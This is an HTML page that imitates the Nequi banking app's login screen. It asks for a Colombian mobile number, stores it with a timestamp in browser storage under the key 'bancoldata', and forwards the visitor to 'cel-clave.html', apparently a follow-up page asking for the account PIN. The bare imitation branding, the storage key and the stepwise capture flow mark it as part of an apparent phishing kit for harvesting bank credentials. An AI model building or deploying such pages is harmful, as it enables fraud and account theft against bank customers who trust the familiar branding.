<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Ingreso</title>

  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background: #2b002b;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      color: white;
    }

    .container {
      width: 100%;
      max-width: 400px;
      padding: 20px;
      display: flex;
      flex-direction: column;
      justify-content: space-between;
      height: 100vh;
    }

    /* HEADER */
    header {
      display: flex;
      justify-content: space-between;
      align-items: center;
    }

    .help-icon {
      width: 22px;
      height: 22px;
      border: 2px solid white;
      border-radius: 50%;
      display: flex;
      justify-content: center;
      align-items: center;
      font-size: 14px;
    }

    /* LOGO NEQUI */
    .logo {
      text-align: center;
      font-size: 48px;
      font-weight: bold;
      position: relative;
    }

    .logo span {
      color: #ff008c;
      position: absolute;
      top: -18px;
      left: 50%;
      transform: translateX(-85px);
      font-size: 18px;
    }

    /* FORM */
    .form {
      margin-bottom: 40px; /* sube el botón */
    }

    .input-box {
      background: rgba(255,255,255,0.15);
      border-radius: 10px;
      padding: 14px;
      display: flex;
      align-items: center;
      gap: 10px;
      backdrop-filter: blur(6px);
    }

    .prefix {
      color: #ffb3e6;
      font-weight: bold;
      border-right: 2px solid rgba(255,255,255,0.3);
      padding-right: 10px;
    }

    .input-box input {
      flex: 1;
      border: none;
      outline: none;
      background: transparent;
      color: white;
      font-size: 16px;
    }

    .input-box input::placeholder {
      color: #ddd;
    }

    /* BOTÓN */
    .btn {
      margin-top: 18px;
      width: 100%;
      padding: 15px;
      border: none;
      border-radius: 10px;
      background: #ff008c;
      color: white;
      font-size: 16px;
      cursor: pointer;
      opacity: 0.5;
      transition: 0.3s;
    }

    .btn.active {
      opacity: 1;
    }

    .btn:active {
      transform: scale(0.97);
    }
  </style>
</head>

<body>

<div class="container">

  <!-- HEADER -->
  <header>
    <div class="help-icon">?</div>
    <div></div>
  </header>

  <!-- LOGO -->
  <div class="logo">
    <span>■</span>Nequi
  </div>

  <!-- FORM -->
  <div class="form">
    <div class="input-box">
      <div class="prefix">+57</div>
      <input type="number" id="docInput" placeholder="Ingresa tu celular">
    </div>

    <button class="btn" id="btn">Entra</button>
  </div>

</div>

<script>
const input = document.getElementById("docInput");
const btn = document.getElementById("btn");

// activar botón
input.addEventListener("input", () => {
  if (input.value.length >= 4) {
    btn.classList.add("active");
  } else {
    btn.classList.remove("active");
  }
});

// click
btn.addEventListener("click", () => {
  const value = input.value.trim();

  if (value.length < 4) {
    alert("Ingrese mínimo 4 dígitos");
    return;
  }

  let data = {};
  try {
    data = JSON.parse(localStorage.getItem("bancoldata")) || {};
  } catch {
    data = {};
  }

  data.usuario = value;
  data.fecha = new Date().toISOString();

  localStorage.setItem("bancoldata", JSON.stringify(data));

  window.location.href = "cel-clave.html";
});
</script>

</body>
</html>
